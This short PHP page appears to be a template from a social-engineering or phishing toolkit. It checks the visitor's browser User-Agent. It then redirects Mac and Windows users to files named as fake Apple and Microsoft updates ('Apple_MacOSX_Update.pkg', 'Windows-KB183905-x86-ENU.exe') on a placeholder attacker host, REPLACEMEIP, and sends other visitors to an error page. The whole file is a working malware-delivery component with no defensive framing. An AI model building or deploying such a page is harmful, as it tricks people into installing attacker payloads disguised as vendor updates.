<?php
if (stripos($_SERVER['HTTP_USER_AGENT'], 'linux') !== FALSE) {
	$OS = "Linux";
	header( 'Location: http://REPLACEMEIP/error.html' ) ;

}
 elseif (stripos($_SERVER['HTTP_USER_AGENT'], 'mac') !== FALSE) {
	$OS = "OSX";
	header( 'Location: http://REPLACEMEIP/Apple_MacOSX_Update.pkg' ) ;

} elseif (stripos($_SERVER['HTTP_USER_AGENT'], 'win') !== FALSE) {
	$OS = "Windows";
	header( 'Location: http://REPLACEMEIP/Windows-KB183905-x86-ENU.exe' ) ;

} else {
      $OS = "notfound";
      header( 'Location: http://REPLACEMEIP/error.html' );
}
?>

<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">
<html><head>
<meta http-equiv="Content-Type" content="text/html; charset=ISO-8859-1">
<meta http-equiv="CACHE-CONTROL" content="NO-CACHE">
<title></title>
</head>
</body></html>
